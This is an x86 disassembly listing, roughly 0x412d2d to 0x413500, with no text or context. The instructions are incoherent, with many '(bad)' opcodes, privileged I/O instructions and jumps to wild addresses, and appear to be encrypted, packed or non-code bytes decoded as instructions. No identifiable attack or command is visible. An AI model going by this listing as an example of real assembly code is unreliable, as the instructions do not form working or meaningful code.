  412d2d:	outs   dx,BYTE PTR ds:[esi]
  412d2e:	xor    eax,0xe99f5c47
  412d33:	cld    
  412d34:	retf   0xc0cd
  412d37:	jp     0x412db3
  412d39:	mov    ecx,0xbf804160
  412d3e:	inc    edx
  412d3f:	cmp    eax,0x29049173
  412d44:	pushf  
  412d45:	or     al,0x4f
  412d47:	(bad)  
  412d48:	std    
  412d49:	xor    bl,dh
  412d4b:	rol    DWORD PTR [edi-0x34],cl
  412d4e:	jns    0x412cf6
  412d50:	cmp    BYTE PTR [esi-0x54],ch
  412d53:	ins    DWORD PTR es:[edi],dx
  412d54:	popa   
  412d55:	jno    0x412d4d
  412d57:	call   0xc431c225
  412d5c:	mov    dl,0x40
  412d5e:	sbb    al,0x4d
  412d60:	pop    ebx
  412d61:	imul   esp,DWORD PTR [edi+0x7a0f4524],0xdb84d469
  412d6b:	cli    
  412d6c:	aad    0x23
  412d6e:	jp     0x412dc8
  412d70:	les    edx,FWORD PTR [esi]
  412d72:	inc    eax
  412d73:	push   0x153ec7dc
  412d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d79:	mov    ds:0x8612669f,eax
  412d7e:	mov    cl,0x12
  412d80:	cmc    
  412d81:	sub    ecx,esp
  412d83:	std    
  412d84:	add    ch,bh
  412d86:	aaa    
  412d87:	pop    ebp
  412d88:	or     ecx,DWORD PTR [ecx-0x55828a43]
  412d8e:	xchg   ah,ch
  412d90:	and    dh,BYTE PTR [esi]
  412d92:	mov    edi,0x877e72e9
  412d97:	xor    esi,edx
  412d99:	pushf  
  412d9a:	ret    
  412d9b:	in     al,dx
  412d9c:	mov    edx,0x21d6a0b7
  412da1:	dec    edi
  412da2:	dec    edx
  412da3:	jmp    0xed990ef2
  412da8:	xor    cl,al
  412daa:	mov    WORD PTR [ebx+0x5f],?
  412dad:	leave  
  412dae:	call   0x5296:0x4c30ee9b
  412db5:	mov    cl,0x75
  412db7:	push   cs
  412db8:	je     0x412db8
  412dba:	fnstsw WORD PTR [edx]
  412dbc:	sahf   
  412dbd:	push   esi
  412dbe:	test   al,0xc0
  412dc0:	and    eax,0x6f6f038
  412dc5:	jo     0x412e24
  412dc7:	int    0x28
  412dc9:	and    dl,BYTE PTR [esi-0x2d0b3c84]
  412dcf:	(bad)  
  412dd1:	in     eax,dx
  412dd2:	pop    esp
  412dd3:	imul   edi,DWORD PTR [edi-0x72],0x16
  412dd7:	lea    esp,[esi-0x7c]
  412dda:	xchg   ebx,eax
  412ddb:	mov    dh,0xed
  412ddd:	pop    edx
  412dde:	(bad)  
  412ddf:	lds    edi,FWORD PTR [ebp+ecx*2-0x6f]
  412de3:	jl     0x412e2f
  412de5:	call   0x1d99:0x9ebc5210
  412dec:	retf   0x72a8
  412def:	mov    ah,0xaa
  412df1:	fcomp  QWORD PTR [esi]
  412df3:	inc    eax
  412df4:	pusha  
  412df5:	cs iret 
  412df7:	add    esi,ebp
  412df9:	and    al,0x8d
  412dfb:	int    0x8
  412dfd:	push   es
  412dfe:	loop   0x412e6b
  412e00:	fs dec edi
  412e02:	ret    
  412e03:	sub    BYTE PTR [edx],0xec
  412e06:	loopne 0x412e3f
  412e08:	and    al,0xdc
  412e0a:	mov    ah,0x85
  412e0c:	leave  
  412e0d:	sub    eax,0xc495f06f
  412e12:	icebp  
  412e13:	fmul   DWORD PTR [eax-0x2d978e38]
  412e19:	cdq    
  412e1a:	(bad)
  412e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e1e:	jg     0x412e92
  412e20:	mov    cl,ch
  412e22:	mov    edi,0xc47303a2
  412e27:	push   0xffffffc4
  412e29:	inc    esp
  412e2a:	(bad)  
  412e2b:	fisttp DWORD PTR [ecx]
  412e2d:	add    BYTE PTR [edi-0x26],bh
  412e30:	out    dx,al
  412e31:	popa   
  412e32:	add    eax,0x66216801
  412e37:	sar    dh,0x51
  412e3a:	sub    al,0x11
  412e3c:	xlat   BYTE PTR ds:[ebx]
  412e3d:	inc    edx
  412e3e:	mov    cs,WORD PTR [ebx+edi*8-0x6ea42452]
  412e45:	fild   DWORD PTR [ebp-0x51]
  412e48:	retf   
  412e49:	add    eax,0xb7da7bff
  412e4e:	test   BYTE PTR [esi+0x44bb8960],ch
  412e54:	xchg   edx,eax
  412e55:	ss pusha 
  412e57:	and    dh,bl
  412e59:	xchg   ecx,eax
  412e5a:	sbb    al,0xf4
  412e5c:	cmp    eax,0x4ea56fa8
  412e61:	and    eax,0x1153c8b3
  412e66:	xchg   BYTE PTR [ebx],dh
  412e68:	jb     0x412e1d
  412e6a:	(bad)  
  412e6b:	jp     0x412dfd
  412e6d:	mov    esi,0xbd345067
  412e72:	iret   
  412e73:	adc    BYTE PTR [edx+ebp*2],cl
  412e76:	aas    
  412e77:	push   edi
  412e78:	xchg   DWORD PTR [ebx+0x51],esp
  412e7b:	lods   al,BYTE PTR ds:[esi]
  412e7c:	lahf   
  412e7d:	dec    edi
  412e7e:	dec    edx
  412e7f:	ret    
  412e80:	test   eax,0x326888ab
  412e85:	push   edx
  412e86:	ds mov dl,0xd9
  412e89:	popa   
  412e8a:	rol    ebp,1
  412e8c:	aaa    
  412e8d:	mov    ah,0x85
  412e8f:	fs retf 0xb3f1
  412e93:	add    ch,BYTE PTR [eax+0xdd11208]
  412e99:	retf   0x9b2e
  412e9c:	mov    edx,0xb397a53f
  412ea1:	jae    0x412e41
  412ea3:	popf   
  412ea4:	adc    al,0x51
  412ea6:	inc    edx
  412ea7:	int    0x41
  412ea9:	xchg   ebx,eax
  412eaa:	js     0x412ed8
  412eac:	data16 gs or al,0xc0
  412eb0:	ins    DWORD PTR es:[edi],dx
  412eb1:	mov    eax,ds:0xffd0d6cb
  412eb6:	adc    DWORD PTR [eax-0x64e727b3],ecx
  412ebc:	(bad)  
  412ebd:	jl     0x412eaa
  412ebf:	pop    DWORD PTR [edx-0x534441ef]
  412ec5:	and    BYTE PTR ds:0x4aca74ac,ah
  412ecb:	jmp    0xa62e:0x552f2851
  412ed2:	test   DWORD PTR [ebp-0x5c],ebp
  412ed5:	mov    ?,WORD PTR [edi]
  412ed7:	push   ss
  412ed8:	sbb    DWORD PTR [ebp-0x56e849cc],ecx
  412ede:	pop    ecx
  412edf:	xchg   ecx,eax
  412ee0:	lods   eax,DWORD PTR ds:[esi]
  412ee1:	shr    DWORD PTR ds:0x7e1880a7,cl
  412ee7:	xor    DWORD PTR [esi-0x2e9cf80c],esi
  412eed:	aaa    
  412eee:	adc    eax,0xc4daa36a
  412ef3:	imul   esi,DWORD PTR [esi-0x61905fba],0xb9fde64e
  412efd:	les    eax,FWORD PTR [eax-0x36]
  412f00:	xor    eax,0x225cc2bc
  412f05:	mov    edx,0x1b988a84
  412f0a:	arpl   cx,bp
  412f0c:	imul   BYTE PTR [esi]
  412f0e:	push   ebx
  412f0f:	lea    ebx,[ebx]
  412f11:	popf   
  412f12:	adc    DWORD PTR [ebx+ebx*2],ebx
  412f15:	(bad)  
  412f17:	push   ds
  412f18:	adc    dh,bh
  412f1a:	nop
  412f1b:	or     bh,BYTE PTR [ebp+0x68]
  412f1e:	sbb    ebp,ebx
  412f20:	xchg   edi,eax
  412f21:	adc    esp,DWORD PTR ds:0x8671b91d
  412f27:	shl    BYTE PTR [ebp-0x6c9b84a],1
  412f2d:	fwait
  412f2e:	loope  0x412efc
  412f30:	mov    al,0x31
  412f32:	js     0x412f8e
  412f34:	lds    ecx,FWORD PTR [edx]
  412f36:	add    DWORD PTR [ebp+ebx*1-0x3a],esi
  412f3a:	push   edx
  412f3b:	add    BYTE PTR [esi-0x1f],cl
  412f3e:	enter  0x97df,0x68
  412f42:	mov    ebp,0x52a182e4
  412f47:	ret    
  412f48:	add    eax,0x9344086a
  412f4d:	aaa    
  412f4e:	mov    DWORD PTR [edi-0x64d8eb47],0x70d3b76f
  412f58:	jmp    0x412f3a
  412f5a:	inc    ecx
  412f5b:	loopne 0x412fc2
  412f5d:	inc    edx
  412f5e:	enter  0xf10f,0x63
  412f62:	mov    ds:0xa56f218e,al
  412f67:	imul   ebx,DWORD PTR [edx+0xff3cb9b],0xffffffb3
  412f6e:	xor    al,0xbf
  412f70:	xchg   BYTE PTR [ecx],dl
  412f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f73:	loope  0x412f99
  412f75:	add    eax,0x92c29383
  412f7a:	add    edx,eax
  412f7c:	int3   
  412f7d:	xchg   esi,eax
  412f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f7f:	and    ch,0x49
  412f82:	xor    ecx,DWORD PTR [edx+0x2a]
  412f85:	adc    eax,0xc3737438
  412f8a:	mov    BYTE PTR [esi],dh
  412f8c:	ja     0x412fdd
  412f8e:	hlt    
  412f8f:	dec    eax
  412f90:	repnz push esi
  412f92:	mov    DWORD PTR [ecx+0x7ca88c97],0x5ec9734
  412f9c:	aam    0xfe
  412f9e:	fs mov ch,0xc4
  412fa1:	xchg   ebp,eax
  412fa2:	test   DWORD PTR [edi+0x5a],0xfde7a125
  412fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412faa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fab:	inc    ecx
  412fac:	arpl   WORD PTR [ebp+0x56],dx
  412faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fb0:	fcmovbe st,st(0)
  412fb2:	dec    ebp
  412fb3:	xor    ebp,DWORD PTR gs:[edi]
  412fb6:	and    eax,0xe5f9ece5
  412fbb:	lea    esi,[edi+ecx*2-0x4bdccc57]
  412fc2:	add    DWORD PTR [ecx],esi
  412fc4:	mov    al,BYTE PTR [edx]
  412fc6:	mov    edi,0x3288d54d
  412fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fcc:	fwait
  412fcd:	outs   dx,DWORD PTR ds:[esi]
  412fce:	ficom  DWORD PTR cs:[ebp-0x57]
  412fd2:	sub    DWORD PTR [edi],0xffffffaa
  412fd5:	push   eax
  412fd6:	or     dh,BYTE PTR [edi-0x2e]
  412fd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fda:	cld    
  412fdb:	push   ss
  412fdc:	arpl   WORD PTR [ebp+0x7c],cx
  412fdf:	test   ch,dh
  412fe1:	mov    DWORD PTR [ecx+0x5d],ecx
  412fe4:	sbb    edi,DWORD PTR [esi]
  412fe6:	ja     0x412f81
  412fe8:	mov    esi,0x9486b5ff
  412fed:	and    eax,DWORD PTR [edx-0x43d5e729]
  412ff3:	jp     0x413064
  412ff5:	sub    BYTE PTR ds:0x9877d102,bl
  412ffb:	push   eax
  412ffc:	sub    DWORD PTR [ebp+0x63],0xf0b9cc55
  413003:	int3   
  413004:	(bad)  
  413005:	pusha  
  413006:	jnp    0x412f8d
  413008:	adc    esi,edx
  41300a:	push   ebx
  41300b:	sbb    ch,BYTE PTR [ecx+0x49bd6beb]
  413011:	ja     0x41303d
  413013:	cmp    DWORD PTR cs:[ecx],ebp
  413016:	pop    ss
  413017:	test   al,0xe2
  413019:	out    dx,eax
  41301a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41301b:	adc    al,0x66
  41301d:	in     al,0xbb
  41301f:	fadd   QWORD PTR [eax]
  413021:	sbb    DWORD PTR [edi],0x7b
  413024:	dec    ebx
  413025:	xchg   edi,eax
  413026:	popf   
  413027:	aaa    
  413028:	fistp  WORD PTR [edx]
  41302a:	lods   eax,DWORD PTR ds:[esi]
  41302b:	loope  0x41305a
  41302d:	nop
  41302e:	(bad)
  413033:	xchg   DWORD PTR [ecx-0x48],ebx
  413036:	(bad)
  413039:	and    BYTE PTR [edx],cl
  41303b:	cmc    
  41303c:	jge    0x4130a7
  41303e:	pop    eax
  41303f:	sbb    cl,BYTE PTR [edx+0x2f273ab]
  413045:	mov    ch,ah
  413047:	shl    DWORD PTR [edx+0x3f5457b0],1
  41304d:	mov    bl,0x41
  41304f:	rol    DWORD PTR [edx],0x11
  413052:	mov    ah,0x4e
  413054:	mov    dh,0x49
  413056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413057:	xor    edx,DWORD PTR [edi+ebp*2+0x1c]
  41305b:	jbe    0x41300e
  41305d:	imul   edx,DWORD PTR [edx],0xc44075f9
  413063:	jle    0x413094
  413065:	jns    0x41303b
  413067:	mov    edi,0x624439c4
  41306c:	lock ins BYTE PTR es:[edi],dx
  41306e:	mov    WORD PTR [ecx+eiz*2-0x3],cs
  413072:	push   ds
  413073:	mov    ds:0x4d55d35c,eax
  413078:	out    dx,eax
  413079:	pushf  
  41307a:	inc    esi
  41307b:	ins    BYTE PTR es:[edi],dx
  41307c:	repnz xor eax,0xc711affc
  413082:	push   0xffffff83
  413084:	xchg   edi,eax
  413085:	lea    ebx,[ebp+0x6b]
  413088:	inc    esp
  413089:	les    esi,FWORD PTR [edi]
  41308b:	push   ebx
  41308c:	jno    0x413088
  41308e:	jge    0x413063
  413090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413091:	fcomp  QWORD PTR [edx-0x55]
  413094:	adc    esi,edx
  413096:	sti    
  413097:	sbb    DWORD PTR [ecx-0x1f],ebx
  41309a:	add    al,0xa1
  41309c:	mov    esp,0xb23f6e8e
  4130a1:	pop    ecx
  4130a2:	int    0x4a
  4130a4:	dec    ecx
  4130a5:	rcl    DWORD PTR [esi+0x6ef962ab],cl
  4130ab:	or     al,0xb9
  4130ad:	mov    al,0xae
  4130af:	(bad)  
  4130b0:	in     al,dx
  4130b1:	imul   esi,esp,0x59c552e7
  4130b7:	call   0x9792b52b
  4130bc:	aaa    
  4130bd:	es jp  0x4130e6
  4130c0:	daa    
  4130c1:	call   0xcd4075ba
  4130c6:	add    eax,0x446e2d7a
  4130cb:	jmp    0x3b63:0xec7fccf3
  4130d2:	pop    eax
  4130d3:	inc    edi
  4130d4:	push   cs
  4130d5:	fcomp  st(7)
  4130d7:	xor    ebp,DWORD PTR [eax-0x60]
  4130da:	inc    esi
  4130db:	add    esp,DWORD PTR [edx]
  4130dd:	inc    edi
  4130de:	mov    ecx,0xab0079f1
  4130e3:	mov    ebp,DWORD PTR [esi]
  4130e5:	xor    BYTE PTR [esi],ah
  4130e7:	xor    ebp,DWORD PTR [edx-0x39]
  4130ea:	add    dl,0xe0
  4130ed:	adc    ecx,DWORD PTR [esi+ebp*1-0x1a]
  4130f1:	push   esp
  4130f2:	int    0xf7
  4130f4:	mov    ds:0xeee62b6b,eax
  4130f9:	stc    
  4130fa:	in     al,dx
  4130fb:	je     0x413163
  4130fd:	dec    eax
  4130fe:	into   
  4130ff:	pop    edi
  413100:	sub    BYTE PTR ds:0xc01d7a83,dh
  413106:	ret    0x615b
  413109:	adc    BYTE PTR [eax-0x27ff6dc9],0x79
  413110:	mov    esp,0xccb45fc2
  413115:	mov    ?,esi
  413117:	scas   al,BYTE PTR es:[edi]
  413118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413119:	push   ebp
  41311a:	ds and al,0xb9
  41311d:	popa   
  41311e:	adc    esi,ecx
  413120:	adc    al,0x9f
  413122:	in     al,0x97
  413124:	or     BYTE PTR [ebp+0x59af352c],cl
  41312a:	mov    WORD PTR [esi],cs
  41312c:	mov    al,ds:0x8b249f2b
  413131:	and    DWORD PTR [edx+0x75],edx
  413134:	ret    0x6afe
  413137:	jo     0x4131a2
  413139:	adc    bh,BYTE PTR [eax-0x5dbd8ed3]
  41313f:	xchg   DWORD PTR [ebp+0xa],ebx
  413142:	sub    cl,BYTE PTR [ebx]
  413144:	inc    edi
  413145:	into   
  413146:	pushf  
  413147:	jg     0x413197
  413149:	(bad)  
  41314a:	mov    edi,0xd90435f9
  41314f:	cmp    al,cl
  413151:	in     al,0x72
  413153:	dec    edx
  413154:	sub    al,ch
  413156:	sbb    BYTE PTR [eax-0x32],dh
  413159:	imul   BYTE PTR [ebp-0x7b4a5db0]
  41315f:	mov    bl,0xab
  413161:	dec    ebp
  413162:	aad    0xf8
  413164:	mov    cl,0x2c
  413166:	sti    
  413167:	call   FWORD PTR [edi+0x72]
  41316a:	mov    edx,0xe13e31d2
  41316f:	rcr    BYTE PTR [ebx],cl
  413171:	sub    eax,0x26e2fec
  413176:	xchg   ecx,eax
  413177:	xor    eax,0xaea63d46
  41317c:	jecxz  0x4131df
  41317e:	pop    ds
  41317f:	push   esp
  413180:	mov    ds:0x453ece2f,al
  413185:	or     ebp,esp
  413187:	sub    al,0x82
  413189:	sti    
  41318a:	ss aam 0x6d
  41318d:	dec    ebp
  41318e:	and    ch,BYTE PTR [edi+0x40d3e557]
  413194:	popf   
  413195:	shl    BYTE PTR [edx],1
  413197:	leave  
  413198:	test   BYTE PTR [ecx],ch
  41319a:	mov    ds:0x427c0d72,al
  41319f:	lods   eax,DWORD PTR ds:[esi]
  4131a0:	lahf   
  4131a1:	push   ecx
  4131a2:	ins    DWORD PTR es:[edi],dx
  4131a3:	aam    0xfc
  4131a5:	fmul   DWORD PTR [edi-0x2a64dd9a]
  4131ab:	sub    al,0xd4
  4131ad:	sub    eax,0x249ba58d
  4131b2:	cld    
  4131b3:	inc    ebx
  4131b4:	(bad)  
  4131b5:	into   
  4131b6:	out    0x52,al
  4131b8:	outs   dx,DWORD PTR ds:[esi]
  4131b9:	mov    ebx,0x93c0562f
  4131be:	popf   
  4131bf:	fst    DWORD PTR [edi]
  4131c1:	and    bl,BYTE PTR [ecx-0x23]
  4131c4:	xlat   BYTE PTR ds:[ebx]
  4131c5:	push   0xa8f65663
  4131ca:	mov    esi,0x9a3d1b17
  4131cf:	inc    edi
  4131d0:	mov    ah,0x63
  4131d2:	or     al,0xef
  4131d4:	imul   ebp,DWORD PTR [esi-0x15],0x11
  4131d8:	outs   dx,DWORD PTR ds:[esi]
  4131d9:	ds ror bl,0xf4
  4131dd:	(bad)  
  4131de:	cmp    DWORD PTR [ecx],ebx
  4131e0:	pop    es
  4131e1:	xchg   ecx,eax
  4131e2:	mov    WORD PTR [ecx],?
  4131e4:	sti    
  4131e5:	scas   al,BYTE PTR es:[edi]
  4131e6:	lods   eax,DWORD PTR ds:[esi]
  4131e7:	pop    edx
  4131e8:	mov    ebp,0xe945eb4a
  4131ed:	fisttp WORD PTR [ebx]
  4131ef:	stos   BYTE PTR es:[edi],al
  4131f0:	jae    0x4131c8
  4131f2:	rol    DWORD PTR [esp+ebx*4-0x78],0x29
  4131f7:	shl    DWORD PTR [ebx-0x5a],cl
  4131fa:	jae    0x41324a
  4131fc:	jbe    0x41327b
  4131fe:	inc    eax
  4131ff:	inc    eax
  413200:	ret    0xe053
  413203:	pop    ebp
  413204:	int    0x6d
  413206:	popa   
  413207:	cmp    DWORD PTR [esi+ecx*1],0xffffffd2
  41320b:	pop    edi
  41320c:	repnz fist WORD PTR [edi-0x64680869]
  413213:	ja     0x413225
  413215:	jbe    0x413246
  413217:	je     0x413211
  413219:	das    
  41321a:	push   edi
  41321b:	mov    eax,ds:0x62567892
  413220:	(bad)  
  413221:	fmul   DWORD PTR [edi]
  413223:	lds    esi,FWORD PTR [ecx]
  413225:	dec    ebp
  413226:	bound  edx,QWORD PTR [eax+edi*4+0x765e310d]
  41322d:	nop
  41322e:	fist   WORD PTR [edi]
  413230:	pop    ds
  413231:	lods   al,BYTE PTR ds:[esi]
  413232:	loope  0x41322d
  413234:	out    0xd0,eax
  413236:	push   esi
  413237:	xor    al,0x2
  41323a:	(bad)  [eax+0x589a453d]
  413240:	mov    eax,ds:0xe7782f96
  413245:	ret    
  413246:	inc    edx
  413247:	out    dx,eax
  413248:	jp     0x413203
  41324a:	ins    DWORD PTR es:[edi],dx
  41324b:	cdq    
  41324c:	inc    edx
  41324d:	jnp    0x41325f
  41324f:	cmp    al,0xfe
  413251:	inc    esi
  413252:	lahf   
  413253:	fstp   TBYTE PTR [edi+ecx*8]
  413256:	in     eax,0x96
  413258:	adc    eax,edx
  41325a:	test   esi,eax
  41325c:	retf   
  41325d:	and    edx,edi
  41325f:	enter  0x6dc6,0x32
  413263:	mov    es,WORD PTR [ebp-0x541ad3ba]
  413269:	aaa    
  41326a:	ret    0x6e6f
  41326d:	or     al,0x4f
  41326f:	ret    0xf63a
  413272:	and    BYTE PTR [edi+0x23],ch
  413275:	jmp    0x4132cc
  413277:	jle    0x413280
  413279:	jp     0x41325c
  41327b:	and    al,0x8
  41327d:	push   esi
  41327e:	lds    edx,FWORD PTR [esi]
  413280:	gs sub al,0x49
  413283:	mov    ds,WORD PTR [ebp-0x39c6ca64]
  413289:	inc    ebx
  41328a:	or     al,0x74
  41328c:	add    al,0xdd
  41328e:	aam    0xc2
  413290:	xlat   BYTE PTR ds:[ebx]
  413291:	enter  0x2823,0xe4
  413295:	in     eax,dx
  413296:	xchg   ebp,eax
  413297:	mov    cl,0xa9
  413299:	fnsave [ebp-0x53ca6df1]
  41329f:	aas    
  4132a0:	lea    ebx,[edi]
  4132a2:	and    cl,BYTE PTR ds:0x8aa81963
  4132a8:	cmp    eax,0x7783ffae
  4132ad:	fmul   st(2),st
  4132af:	pop    ebp
  4132b0:	inc    eax
  4132b1:	rcr    BYTE PTR [eax+0x6afcab3c],1
  4132b7:	lods   al,BYTE PTR ds:[esi]
  4132b8:	jo     0x41332e
  4132ba:	loope  0x4132fe
  4132bc:	pop    ebp
  4132bd:	sub    eax,0xc422fa57
  4132c2:	retf   
  4132c3:	rol    DWORD PTR [edx-0x2],cl
  4132c6:	mov    al,ds:0xb7a5cbe6
  4132cb:	add    bl,dh
  4132cd:	loope  0x41331a
  4132cf:	push   edx
  4132d0:	xor    DWORD PTR [edi+edx*2+0x217fdcba],esi
  4132d7:	jb     0x413295
  4132d9:	retf   0x25f9
  4132dc:	rol    BYTE PTR [esi-0x7b],1
  4132df:	adc    BYTE PTR [eiz*1+0xfd86b26],bl
  4132e6:	sbb    eax,0xcb3309bc
  4132eb:	mov    WORD PTR [edi-0x4a],ds
  4132ee:	xchg   esi,eax
  4132ef:	jns    0x413305
  4132f1:	lods   al,BYTE PTR ds:[esi]
  4132f2:	or     DWORD PTR [edi],edi
  4132f4:	daa    
  4132f5:	mov    ds:0x8a3bdd4d,eax
  4132fa:	popf   
  4132fb:	add    BYTE PTR [edx+0x61],0x82
  4132ff:	sahf   
  413300:	arpl   WORD PTR [ecx+ecx*8+0x59],bp
  413304:	jmp    0x5db:0x3c4c09b3
  41330b:	sub    DWORD PTR [eax-0x36],esi
  41330e:	jo     0x4132c1
  413310:	mov    cl,0xd3
  413312:	enter  0xd40c,0x2a
  413316:	sub    dh,BYTE PTR [edx]
  413318:	xchg   ch,bl
  41331a:	pop    es
  41331b:	fld    TBYTE PTR [edx-0x705ccda5]
  413321:	shr    esp,0x48
  413324:	xchg   ecx,eax
  413325:	push   ds
  413326:	fild   WORD PTR [esi]
  413328:	in     eax,0x80
  41332a:	je     0x413383
  41332c:	ss (bad) 
  41332e:	cdq    
  41332f:	dec    esp
  413331:	rol    dh,1
  413333:	push   ss
  413334:	test   ch,bl
  413336:	xor    BYTE PTR [edi-0x43],0x9d
  41333a:	sub    BYTE PTR [ebx+0x5f807a4b],cl
  413340:	mov    bl,0xa4
  413342:	pop    eax
  413343:	dec    ebp
  413344:	aas    
  413345:	addr16 cmp eax,0xd884529a
  41334b:	test   al,0xda
  41334d:	jo     0x413373
  41334f:	adc    al,BYTE PTR [ecx+0x1f]
  413352:	scas   eax,DWORD PTR es:[edi]
  413353:	and    eax,0x231f3b7
  413358:	push   sp
  41335a:	shl    edx,0xfb
  41335d:	mov    DWORD PTR [ebx+0x14],edx
  413360:	rol    BYTE PTR [ebx+0x3b],cl
  413363:	das    
  413364:	mov    ds:0x83823306,eax
  413369:	or     al,0x67
  41336b:	sub    esi,DWORD PTR [edx]
  41336d:	adc    eax,0x27362f1d
  413372:	add    ah,BYTE PTR [edi]
  413374:	sbb    DWORD PTR [ebx],ebx
  413376:	xor    cl,BYTE PTR [esi+0x7f]
  413379:	sbb    dh,BYTE PTR [ecx+0x4115057c]
  41337f:	out    dx,al
  413380:	or     al,0x1
  413382:	lds    ecx,FWORD PTR [ebx+eax*8-0x27]
  413386:	adc    BYTE PTR [ebp+0x18],dh
  413389:	xlat   BYTE PTR ds:[ebx]
  41338a:	cmp    ah,ch
  41338c:	adc    bh,BYTE PTR [eax-0xf]
  41338f:	(bad)  
  413390:	fcomp  DWORD PTR [ebp-0x4484acd0]
  413396:	jecxz  0x413346
  413398:	jp     0x413320
  41339a:	in     eax,0x9d
  41339c:	ret    
  41339d:	jecxz  0x413373
  41339f:	mov    ah,0x48
  4133a1:	jmp    0x413352
  4133a3:	mov    ebx,0x93eabc18
  4133a8:	or     ebx,DWORD PTR [ecx-0x44]
  4133ab:	sub    DWORD PTR [edx+0x3c],eax
  4133ae:	and    edx,DWORD PTR ds:0xed681b64
  4133b4:	push   eax
  4133b5:	adc    esi,DWORD PTR [edi+ebp*2]
  4133b8:	aam    0x2
  4133ba:	(bad)  
  4133bc:	cmp    al,0x61
  4133be:	xlat   BYTE PTR ds:[ebx]
  4133bf:	add    ch,dh
  4133c1:	mov    ah,0xad
  4133c3:	fnstcw WORD PTR [esi]
  4133c5:	add    eax,0xf2a54ed9
  4133ca:	daa    
  4133cb:	stc    
  4133cc:	and    BYTE PTR [esp+edi*2],0x4f
  4133d0:	jle    0x413390
  4133d2:	loopne 0x41340d
  4133d4:	mov    dh,0xa6
  4133d6:	ret    
  4133d7:	clc    
  4133d8:	mov    bl,0x6f
  4133da:	in     eax,0x6a
  4133dc:	and    al,BYTE PTR [ebp-0x1b]
  4133df:	inc    ebp
  4133e0:	aas    
  4133e1:	cmp    al,dh
  4133e3:	ins    DWORD PTR es:[edi],dx
  4133e4:	adc    DWORD PTR [esi-0x6a74068],edi
  4133ea:	cmp    DWORD PTR [edx-0x3],0x5
  4133ee:	test   BYTE PTR [ebp+ebp*4-0x12],0x82
  4133f3:	xor    BYTE PTR [edx+edi*1+0x6945bf75],ah
  4133fa:	fadd   st,st(5)
  4133fc:	dec    esp
  4133fd:	scas   eax,DWORD PTR es:[edi]
  4133fe:	test   eax,0xa5839abf
  413403:	push   0xf302b225
  413408:	and    DWORD PTR [ebp-0x6602fd28],0x980a660f
  413412:	clc    
  413413:	jns    0x4133d9
  413415:	mov    WORD PTR [edi+0x3941ff81],ss
  41341b:	xor    dh,ch
  41341d:	test   BYTE PTR [ebx+0x668b5d99],dh
  413423:	pop    esp
  413424:	mov    ds:0x6205d731,eax
  413429:	aam    0x5f
  41342b:	xchg   ebp,eax
  41342c:	inc    esp
  41342d:	xchg   BYTE PTR [eax+edx*2-0x14e9d812],bl
  413434:	out    0xaa,eax
  413436:	xchg   ebp,eax
  413437:	scas   al,BYTE PTR es:[edi]
  413438:	pop    ecx
  413439:	std    
  41343a:	inc    esi
  41343b:	popf   
  41343c:	cmp    ebx,ebx
  41343e:	fcomp  st(1)
  413440:	repz lds ecx,FWORD PTR [esi-0xd079ba7]
  413447:	push   ebx
  413448:	stos   DWORD PTR es:[edi],eax
  413449:	bound  ebx,QWORD PTR [ebx+ebx*8+0x52]
  41344d:	dec    ebx
  41344e:	xor    DWORD PTR [ebx-0x1],0x2253e78c
  413455:	jecxz  0x4133d8
  413457:	jmp    0x4134b7
  413459:	or     BYTE PTR [esi+0x129ad581],al
  41345f:	xchg   edi,eax
  413460:	push   ss
  413461:	sbb    al,0xc8
  413463:	fnsave [edx]
  413465:	push   edx
  413466:	(bad)  
  413467:	stos   DWORD PTR es:[edi],eax
  413468:	iret   
  413469:	pop    eax
  41346a:	jle    0x4134e9
  41346c:	call   0xfa0c4808
  413471:	repnz das 
  413473:	sub    bh,BYTE PTR [ecx]
  413475:	jg     0x413435
  413477:	dec    ebp
  413478:	mov    DWORD PTR [edx],0x775bb3cc
  41347e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41347f:	outs   dx,BYTE PTR ds:[esi]
  413480:	or     al,0x47
  413482:	sbb    BYTE PTR [ebx],0x9
  413485:	fnstsw WORD PTR [edx+0x7806f8a]
  41348b:	xor    BYTE PTR [edi+edx*1+0x6a8cadab],ch
  413492:	test   eax,0xe70cd397
  413497:	jmp    0x4134d1
  413499:	mov    al,ds:0x4549cfab
  41349e:	inc    eax
  41349f:	inc    edi
  4134a0:	push   ss
  4134a1:	setno  BYTE PTR [ebp-0x2903a872]
  4134a8:	mov    al,ds:0x63f9a629
  4134ad:	jle    0x4134ba
  4134af:	inc    ebp
  4134b0:	mov    ds:0x3e55c3a5,al
  4134b5:	outs   dx,BYTE PTR ds:[esi]
  4134b6:	sbb    al,0x29
  4134b8:	daa    
  4134b9:	inc    ebp
  4134ba:	gs and ebp,esp
  4134bd:	aas    
  4134be:	mov    edi,0x7ebcb07e
  4134c3:	dec    esp
  4134c4:	in     al,0x6
  4134c6:	pop    esi
  4134c7:	or     bh,BYTE PTR [ebp+0x75c51bab]
  4134cd:	mov    esp,0x15df7e26
  4134d2:	push   eax
  4134d3:	cmp    ebx,DWORD PTR [ebp-0x8ea22fd]
  4134d9:	mov    edi,ebp
  4134db:	cli    
  4134dc:	das    
  4134dd:	ret    
  4134de:	cmp    DWORD PTR [ebx],edx
  4134e0:	mov    cl,0x7a
  4134e2:	pop    eax
  4134e3:	cli    
  4134e4:	mov    BYTE PTR [ecx],al
  4134e6:	in     eax,dx
  4134e7:	fsubr  QWORD PTR [edi]
  4134e9:	addr16 jmp 0x945b:0x9719a4a2
  4134f1:	jecxz  0x413474
  4134f3:	pop    ss
  4134f4:	adc    esp,eax
  4134f6:	mov    ebp,0x6eacc383
  4134fb:	add    al,0x6d
  4134fd:	adc    dl,ah
  4134ff:	push   ss
  413500:	arpl   di,sp
